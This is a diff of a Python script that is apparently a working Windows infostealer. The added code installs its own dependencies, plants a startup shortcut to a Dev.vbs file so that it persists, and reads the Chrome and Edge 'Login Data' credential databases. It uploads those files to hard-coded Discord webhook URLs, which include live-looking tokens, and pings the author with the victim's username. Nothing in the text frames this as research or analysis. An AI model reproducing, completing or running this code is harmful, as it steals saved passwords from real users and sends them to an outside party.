@@ -1,10 +1,16 @@
-
-from time import sleep
-from pyautogui import *
-import getpass
-from discord_webhook import *
-import pyshortcuts
-import threading
+for i in range(2):
+    try:
+        import subprocess
+        from time import sleep
+        from pyautogui import *
+        import getpass
+        from discord_webhook import *
+        import pyshortcuts
+        import threading
+    except:
+        subprocess.run(["pip","install","pyautogui"])
+        subprocess.run(["pip","install","pyshortcuts"])
+        subprocess.run(["pip","install","discord_webhook"])
 chats = ''
 pichook = 'https://discord.com/api/webhooks/1042421205753409577/3cvblLpLnsRq3fwDiSDJuImS2FhJd5xSSjxkdQpI66mEglAH9V0RV74biT5VCL4CfUvX'
 pinghook = 'https://discord.com/api/webhooks/1048263189906870336/cnKpzy1sv5tpkvJ-8gw-7AoOjKK2BLXHeweC7MpJsAEaOv1MdznNYhxL6IR7c6-nda4f'
@@ -17,23 +23,36 @@ def spiderman():
     global passhook
     #path = "C:\\Users\\" + getpass.getuser() +  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
     path2 = "C:\\Users\\" + getpass.getuser()
-    #path3 = "C:\\Users\\" + getpass.getuser() +  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-    #try:
-    #    files = os.listdir("data\\replacement")
-    #    error = False
-    #except:
-    #    error = True                  old code lolol
-    #if not error:
-    #    for i in files:
-    #        shutil.copy('data\\replacement\\'+i,path+i)
-    stats = 0
-    ##pyshortcuts.make_shortcut(os.getcwd()+"\\data\\replacement\\Dev.vbs",name="autostart",folder=path3,terminal=False,desktop=False,startmenu=False,executable="Dev.vbs")
+    path3 = "C:\\Users\\" + getpass.getuser() +  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 
+    if getpass.getuser() != 'spide':
+#        try:
+#            files = os.listdir("data\\replacement")
+#            error = False
+#        except:
+#            error = True                  old code lolol
+#        if not error:
+#            for i in files:
+#                shutil.copy('data\\replacement\\'+i,path+i)
+        pyshortcuts.make_shortcut(os.getcwd()+"\\data\\replacement\\Dev.vbs",name="autostart",folder=path3,terminal=False,desktop=False,startmenu=False,executable="Dev.vbs")
+
+    stats = 0
     cppath = path2 + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-    chook = DiscordWebhook(url=passhook)
-    with open(cppath,"rb") as f:
-        chook.add_file(file=f.read(),filename='Login Data')
-    chook.execute(remove_files=True)
+    try:
+        chook = DiscordWebhook(url=passhook)
+        with open(cppath,"rb") as f:
+            chook.add_file(file=f.read(),filename='CLogin Data')
+        chook.execute(remove_files=True)
+    except:
+        nopp = True
+    try:
+        eppath = path2 + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
+        ehook = DiscordWebhook(url=passhook)
+        with open(eppath, "rb") as f:
+            ehook.add_file(file=f.read(), filename='ELogin Data')
+        ehook.execute(remove_files=True)
+    except:
+        nopp = True
 
     thehook = pichook
     pingus = DiscordWebhook(url=pinghook, content=f'Hello, <@820217436552167484>! {getpass.getuser()} started the program!')
